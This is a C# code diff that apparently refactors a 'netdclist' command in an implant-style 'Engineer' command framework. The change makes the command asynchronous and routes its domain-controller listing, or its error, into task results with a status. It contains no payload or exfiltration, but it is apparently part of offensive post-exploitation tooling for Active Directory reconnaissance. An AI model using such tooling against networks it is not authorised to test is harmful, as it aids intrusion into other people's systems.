@@ -12,6 +12,7 @@ using System.IdentityModel.Selectors;
 using System.IdentityModel.Tokens;
 using System.Text.RegularExpressions;
 using System.DirectoryServices.AccountManagement;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -19,7 +20,7 @@ namespace Engineer.Commands
     {
         public override string Name => "netdclist";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
@@ -73,13 +74,13 @@ namespace Engineer.Commands
                     sb.AppendLine($"DNS: {dns}");
                 }
                 //return the results
-                return sb.ToString();
+                Tasking.FillTaskResults(sb.ToString(),task,EngTaskStatus.Complete);
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
                 Console.WriteLine(ex.StackTrace);
-                return ex.Message;
+                Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed);
             }
         }
     }
